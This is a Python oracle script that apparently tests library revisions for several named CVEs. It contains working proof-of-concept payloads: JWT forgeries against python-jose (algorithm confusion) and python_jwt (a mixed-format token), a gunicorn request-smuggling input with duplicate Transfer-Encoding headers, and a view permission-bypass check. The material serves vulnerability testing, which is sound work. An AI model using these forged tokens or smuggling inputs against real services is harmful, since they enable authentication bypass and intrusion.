"""Author-derived bounded adapters; run ONLY inside run_obligation_oracles isolation."""
import ast
import base64
import hashlib
import hmac
import json
from pathlib import Path
import sys
from types import SimpleNamespace

case=sys.argv[1]
if case=='CVE-2022-24761':
    import pytest
    # Unmodified upstream fixed-revision regression tests against each target revision.
    raise SystemExit(pytest.main(['-p','no:cacheprovider','-q','/oracle/test_receiver.py::TestChunkedReceiverParametrized']))
elif case=='CVE-2024-33663':
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.serialization import Encoding,PublicFormat
    from jose import jwt
    key=ec.generate_private_key(ec.SECP256R1()).public_key().public_bytes(Encoding.OpenSSH,PublicFormat.OpenSSH)
    def enc(value):return base64.urlsafe_b64encode(json.dumps(value,separators=(',',':')).encode()).rstrip(b'=')
    body=enc({'alg':'HS256'})+b'.'+enc({'sub':'forged'})
    token=body+b'.'+base64.urlsafe_b64encode(hmac.new(key,body,hashlib.sha256).digest()).rstrip(b'=')
    assert jwt.decode(jwt.encode({'sub':'valid'},'original-control-secret',algorithm='HS256'),'original-control-secret',algorithms=['HS256'])['sub']=='valid'
    try:
        claims=jwt.decode(token.decode(),key,algorithms=['HS256'])
        print(json.dumps(dict(accepted=claims.get('sub')=='forged')))
    except Exception as exc:print(json.dumps(dict(accepted=False,rejection_type=type(exc).__name__)))
elif case=='CVE-2022-39227':
    from datetime import timedelta
    from jwcrypto.jwk import JWK
    from jwcrypto.common import base64url_decode,base64url_encode
    import python_jwt as jwt
    key=JWK.generate(kty='RSA',size=2048)
    signed=jwt.generate_jwt({'sub':'alice'},key,'PS256',timedelta(minutes=60))
    assert jwt.verify_jwt(signed,key,['PS256'])[1]['sub']=='alice'
    header,payload,signature=signed.split('.')
    claims=json.loads(base64url_decode(payload));claims.update(sub='bob',exp=2000000000)
    forged=base64url_encode(json.dumps(claims,separators=(',',':')))
    token='{"  '+header+'.'+forged+'.":"","protected":"'+header+'", "payload":"'+payload+'","signature":"'+signature+'"}'
    try:
        result=jwt.verify_jwt(token,key,['PS256'])
        print(json.dumps(dict(accepted=result[1].get('sub')=='bob')))
    except Exception as exc:print(json.dumps(dict(accepted=False,rejection_type=type(exc).__name__)))
elif case=='CVE-2024-1135':
    from gunicorn.config import Config
    from gunicorn.http.message import Request
    from gunicorn.http.unreader import IterUnreader
    data=b'GET / HTTP/1.1\r\nHost: local.invalid\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\n'
    valid=data.replace(b'Transfer-Encoding: identity\r\n',b'')
    assert Request(Config(),IterUnreader(iter([valid])),None).body.read()==b''
    try:
        request=Request(Config(),IterUnreader(iter([data])),None)
        print(json.dumps(dict(accepted=True,body=request.body.read().decode())))
    except Exception as exc:print(json.dumps(dict(accepted=False,rejection_type=type(exc).__name__)))
elif case=='CVE-2026-82411':
    # Execute the exact method body with bounded helper substitutes. This does NOT
    # exercise the application, real DRF permission policy, database or routing.
    path=Path('/target/src/objects/api/v2/views.py')
    tree=ast.parse(path.read_text())
    node=next(n for c in tree.body if isinstance(c,ast.ClassDef) and c.name=='ObjectViewSet'
              for n in c.body if isinstance(n,ast.FunctionDef) and n.name=='history_detail')
    node.decorator_list=[]
    obj=object()
    def deny(request,record):
        assert record is obj
        raise PermissionError('denied by adapter')
    namespace={'get_object_or_404':lambda *args,**kw:obj,'Response':lambda data:data}
    exec(compile(ast.fix_missing_locations(ast.Module(body=[node],type_ignores=[])),str(path),'exec'),namespace)
    view=SimpleNamespace(request=object(),get_queryset=lambda:[],get_serializer=lambda record:SimpleNamespace(data='record'),check_object_permissions=deny)
    try:
        result=namespace['history_detail'](view,view.request)
        print(json.dumps(dict(accepted=result=='record')))
    except PermissionError:print(json.dumps(dict(accepted=False,rejection_type='PermissionError')))
else:raise ValueError('No registered oracle for '+case)
